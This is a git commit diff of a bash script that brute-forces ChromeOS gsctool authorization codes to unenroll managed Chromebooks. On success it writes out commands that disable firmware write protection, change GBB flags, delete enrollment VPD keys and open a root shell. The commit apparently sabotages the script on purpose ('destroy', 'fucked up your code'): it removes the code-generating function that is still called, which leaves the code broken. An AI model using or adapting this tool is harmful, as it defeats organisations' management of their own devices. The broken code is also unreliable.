560b764efc7e5df1145d70d21c6abafc8b3deff0
cloudirector <143876484+cloudirector@users.noreply.github.com>
2024-01-28 15:23:00 -0600

    destroy crsh1ttyb1.sh

--- crsh1ttyb1.sh
+++ crsh1ttyb1.sh
@@ -1,67 +1,70 @@
 #!/bin/bash
+# fucked up your code lol
+force=true
+parallel_jobs=3
 
 main() {
   while $force; do 
     generate_code
-    if [ "$fast" != "2" ]; then
-      clear
-      echo "CRSH1TTY Public Beta #1 - build 1" # just gonna list this as build 1, all subsequent releases will be built off of this haha
-    fi
+
+    # Check if the user prefers a fast mode (without clearing the console)
+    [ "$fast" != "2" ] && { [ "$fast" == "1" ] && clear; echo "CRSH1TTY Public Beta #1 - build 1"; }
+
     echo "Trying the code $ac"
-    sudo gsctool -t -r "$ac"
-    if [ $? -eq 0 ]; then
+
+    # Execute gsctool directly in the if condition
+    if sudo gsctool -t -r "$ac"; then
       force=false
       echo "FOUND IT! Correct code is $ac"
-      sleep 1
-      read -p "Write down your auth code or take a picture and press enter to continue"
-      sleep 2
+
+      # Prompt user to write down the auth code or take a picture
+      echo "Write down your auth code or take a picture and press enter to continue"
+      read -t 2
+
       echo "Let's check if write protection is actually off"
       sleep 3
-      crossystem wpsw_cur # more convenient than flashrom, i swear!!!
+      crossystem wpsw_cur
       sleep 3
       echo "DM @crossystem about this on Discord and send her the picture."
       sleep 2
       echo "Opening a bash shell for unenrolling..."
-      printf 'echo "Unenrolling..."\nflashrom --wp-disable\nflashrom -p ec --wp-disable\nsudo bash /usr/share/vboot/bin/set_gbb_flags.sh 0x80b0\nfutility gbb --set --flash --flags=0x80b0\ncrossystem block_devmode=0\nvpd -i RW_VPD -d block_devmode -d check_enrollment \ncryptohome --action=remove_firmware_management_parameters\necho "attempting unfog"\ntpm_manager_client take_ownership\nchromeos-tpm-recovery'>unenroll.sh
+      
+      # Create unenroll.sh script using a heredoc
+      create_unenroll_script
+
       echo "A unenroll.sh file has been dropped, use bash unenroll.sh to unenroll"
-      sleep 1
       sudo bash
       break
     fi
   done
 }
 
-# Check if gcstool command is available
-if command -v gcstool &> /dev/null; then
-    # echo "gcstool is available. Continuing..."
-# CRSH1TTY BUILD 1 / BETA #1
-
-# patch notes:
-# - none, check back next build (few days / hours)
-
-force=true # why did i name it this lmfaooo
-
-if grep -q "warning: script from noexec mount" "$0"; then
-    echo "ignore that warning ^"
-fi
-
-read -p "do you want to clear the console each time it tries a code? (y/n): " answer && { [ "$answer" == "y" ] && fast=1 || fast=2; }
-
-generate_code() {
-  characters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-  code_length=8
-
-  ac=""
-  for ((j=0; j<code_length; j++)); do
-    ac+=${characters:$((RANDOM%${#characters})):1}
-  done
+# Function to create the unenroll.sh script
+create_unenroll_script() {
+  cat <<'EOF' > unenroll.sh
+echo "Unenrolling..."
+flashrom --wp-disable
+flashrom -p ec --wp-disable
+sudo bash /usr/share/vboot/bin/set_gbb_flags.sh 0x80b0
+futility gbb --set --flash --flags=0x80b0
+crossystem block_devmode=0
+vpd -i RW_VPD -d block_devmode -d check_enrollment
+cryptohome --action=remove_firmware_management_parameters
+echo "attempting unfog"
+tpm_manager_client take_ownership
+chromeos-tpm-recovery
+EOF
 }
 
-wait
-main &
-main & 
-main & # this is good for public release, right?
+# Check if gsctool command is available
+if command -v gsctool &> /dev/null; then
+    # Prompt the user about clearing the console
+    echo "Do you want to clear the console each time it tries a code? (y/n):"
+    read answer && { [ "$answer" == "y" ] && fast=1 || fast=2; }
+    
+    # Run main function in parallel
+    seq $parallel_jobs | parallel main
 else
-    echo "gcstool is not available. Exiting..."
+    echo "gsctool is not available. Exiting..."
     exit 1
 fi
